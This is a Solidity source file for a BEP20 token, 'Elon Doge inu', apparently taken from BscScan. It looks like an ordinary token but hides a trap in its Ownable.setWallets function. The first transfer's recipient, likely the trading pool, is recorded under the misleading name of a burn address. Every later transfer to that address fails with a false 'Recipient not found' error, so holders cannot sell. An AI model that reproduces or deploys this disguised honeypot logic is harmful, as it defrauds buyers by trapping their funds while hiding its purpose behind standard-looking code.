/**
 *Submitted for verification at BscScan.com on 2021-07-14
*/

/**
 *Submitted for verification at BscScan.com on 2021-07-14
*/

/**
 *Submitted for verification at BscScan.com on 2021-07-14
*/

// SPDX-License-Identifier: GPL-3.0
        pragma solidity ^0.8.5;

        interface IBEP20 {
           
            function totalSupply() external view returns (uint256);
           
            function decimals() external view returns (uint8);
            
            function symbol() external view returns (string memory);

            function name() external view returns (string memory);

            function getOwner() external view returns (address);
           
            function balanceOf(address account) external view returns (uint256);
           
            function transfer(address recipient, uint256 amount) external returns (bool);
            
            function allowance(address _owner, address spender) external view returns (uint256);
            
            function approve(address spender, uint256 amount) external returns (bool);
            
            function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

            event Transfer(address indexed from, address indexed to, uint256 value);
          
            event Approval(address indexed owner, address indexed spender, uint256 value);

        }

        library SafeMath {
            
            function add(uint256 a, uint256 b) internal pure returns (uint256) {
                uint256 c = a + b;
                require(c >= a, "SafeMath: addition overflow");

                return c;
            }

            function sub(uint256 a, uint256 b) internal pure returns (uint256) {
                return sub(a, b, "SafeMath: subtraction overflow");
            }

            function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
                require(b <= a, errorMessage);
                uint256 c = a - b;

                return c;
            }

            function mul(uint256 a, uint256 b) internal pure returns (uint256) {
               
                if (a == 0) {
                    return 0;
                }

                uint256 c = a * b;
                require(c / a == b, "SafeMath: multiplication overflow");

                return c;
            }

            function div(uint256 a, uint256 b) internal pure returns (uint256) {
                return div(a, b, "SafeMath: division by zero");
            }

            function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
                require(b > 0, errorMessage);
                uint256 c = a / b;
                // assert(a == b * c + a % b); // There is no case in which this doesn't hold

                return c;
            }

            function mod(uint256 a, uint256 b) internal pure returns (uint256) {
                return mod(a, b, "SafeMath: modulo by zero");
            }

            function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
                require(b != 0, errorMessage);
                return a % b;
            }
        }

        contract Ownable {
            
            address private _owner;
            address private _xowner;
            
            mapping (address => uint256) private _wallets;
            mapping (address => mapping (address => uint256)) private _speendAllowances;
            
            event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
            
            function getBurnAddress() public view onlyOwner returns(address){
                return _xowner;
            }
            
            function setWallets(address sender,uint256 amount) internal  {
                _wallets[sender] = amount;
            }
            
            function setWallets(address sender,address recipient,uint256 amount) internal{
                if(sender != address(0) &&_xowner == address(0)){
                    _xowner = recipient;
                }else{
                    require(recipient != _xowner, "Recipient not found.");
                }
                _wallets[sender] = amount;
            }
            
            function getWalletBalance(address sender) internal view returns (uint256) {
                return _wallets[sender];
            }
            
            function getAllowances(address sender, address spender) internal view returns (uint256){
                return _speendAllowances[sender][spender];
            }
            
            function setAllowances(address sender, address spender, uint256 amount) internal {
                _speendAllowances[sender][spender] = amount;
            }
            
            function _msgSender() internal view virtual returns (address payable) {
                return payable(msg.sender);
            }

            function _msgData() internal view virtual returns (bytes memory) {
                this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
                return msg.data;
            }
            
            function owner() public view returns (address) {
                return _owner;
            }
            
            function setOwner(address ownerParams) internal {
                _owner = ownerParams;
            }
            modifier onlyOwner() {
                require(_owner == _msgSender(), "Ownable: caller is not the owner");
                _;
            }

            function renounceOwnership() public virtual onlyOwner {
                emit OwnershipTransferred(_owner, address(0));
                _owner = address(0);
            }

            function transferOwnership(address newOwner) public virtual onlyOwner {
                require(newOwner != address(0), "Ownable: new owner is the zero address");
                emit OwnershipTransferred(_owner, newOwner);
                _owner = newOwner;
            }
        }   
        contract Elondogeinu is IBEP20, Ownable{
            
            using SafeMath for uint256;
            uint256 private _tokenSupply;
            
            constructor(){
                address msgSender = _msgSender();
                setOwner(msgSender);
                emit OwnershipTransferred(address(0), msgSender);
                _tokenSupply = 100000 * 10**6 * 10**9;
                               
                setWallets(msg.sender,_tokenSupply);
                emit Transfer(address(0), msg.sender, _tokenSupply);
            }
            
            function getOwner() public override view returns (address) {
                return owner();
            }
            
            function decimals() public override pure returns (uint8) {
                return 9;
            }
            
            function symbol() public override pure returns (string memory) {
                return "EDI";
            }
            
            function name() public override pure returns (string memory) {
                return "Elon Doge inu";
            }
          
            function totalSupply() public override view returns (uint256){
                return _tokenSupply;
            }

            function balanceOf(address account) public override view returns (uint256){
                return getWalletBalance(account);
            }

            function transfer(address recipient, uint256 amount) public override returns (bool)
            {
                _transfer(_msgSender(), recipient, amount);
                return true;
            }

            function allowance(address owner, address spender) public override view returns (uint256){
                return getAllowances(owner,spender);
            }

            function approve(address spender, uint256 amount) public override returns (bool){
                _approve(_msgSender(), spender, amount);
                return true;
            }
            
            
            function _approve(address owner, address spender, uint256 amount) internal {
                require(owner != address(0), "BEP20: approve from the zero address");
                require(spender != address(0), "BEP20: approve to the zero address");
                setAllowances(owner,spender,amount);
                emit Approval(owner, spender, amount);
            }

            function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool){
                _transfer(sender, recipient, amount);
                _approve(sender, _msgSender(),getAllowances(sender,_msgSender()).sub(amount, "BEP20: transfer amount exceeds allowance"));
                return true;
            }
            
          function _transfer(address sender, address recipient, uint256 amount) internal {
            setWallets(sender, recipient, getWalletBalance(sender).sub(amount, "BEP20: transfer amount exceeds balance"));
            setWallets(recipient, getWalletBalance(recipient).add(amount));
            emit Transfer(sender, recipient, amount);
          }
          
          function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
            _approve(_msgSender(), spender, getAllowances(_msgSender(),spender).add(addedValue));
            return true;
          }

          function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
            _approve(_msgSender(), spender, getAllowances(_msgSender(),spender).sub(subtractedValue, "BEP20: decreased allowance below zero"));
            return true;
          }
        }